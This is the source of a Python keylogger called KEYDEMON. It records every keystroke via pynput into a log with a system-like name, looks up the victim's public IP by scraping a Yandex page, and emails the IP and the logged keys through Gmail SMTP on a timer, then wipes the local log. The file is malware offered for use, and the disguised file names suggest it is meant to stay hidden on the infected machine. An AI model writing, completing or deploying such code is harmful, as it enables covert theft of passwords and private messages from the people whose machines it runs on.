'''
NAME: KEYDEMON
AUTHOR: S1DAL3X
VERSION: 1.2
PYTHON: 3.5.0
'''

import os
import logging
import socket
import shutil
import smtplib
import threading
from bs4 import BeautifulSoup
from urllib.request import urlopen
from pynput.keyboard import Key, Listener


NAME = 'WinSystem32keyLogger.pyw'
LOG_NAME = "WinSystem32key.log"
TIME_1 = 10.0
log = []
log_dir = ""
logging.basicConfig(filename = (log_dir + LOG_NAME), level = logging.DEBUG, format = '%(asctime)s: %(message)s') #format = '%(asctime)s: %(message)s'
)

def timer(time):
    t = threading.Timer(TIME_1, get_outside_ip)
    t.start()


def report(ip_adress, log_text):
    report_text = str(ip_adress) + '\n' + 'LOG: \n\n' + '\n'.join(log_text)
    msgObject = smtplib.SMTP('smtp.gmail.com', 587)

    msgObject.starttls()
    msgObject.login('-----------', '------------')
    msgObject.sendmail('--------------', '------------', report_text.encode('utf8'))
    msgObject.quit()
    f = open(LOG_NAME, 'w').close()
    log.clear()

    timer(TIME_1)

def get_outside_ip():
    url = urlopen('https://yandex.ru/internet/')
    soup = BeautifulSoup(url, 'html.parser')
    out_str = soup.find('div', class_='client__desc')
    out_str = str(out_str)
    ip = []

    for symbol in out_str:
        if '1234567890.'.find(symbol) != -1:
            ip.append(symbol)
    outside_ip = ''.join(ip)

    with open(LOG_NAME, 'r') as f:
        for line in f:
            log.append(line + '\n')
    report(outside_ip, log)



def on_press(key):
    logging.info(str(key))


if os.path.exists(os.getcwd() + '\\' + LOG_NAME):
    f = open(LOG_NAME, 'w').close()
    timer(TIME_1)
else:
    timer(TIME_1)


with Listener(on_press = on_press) as listener:
    listener.join()
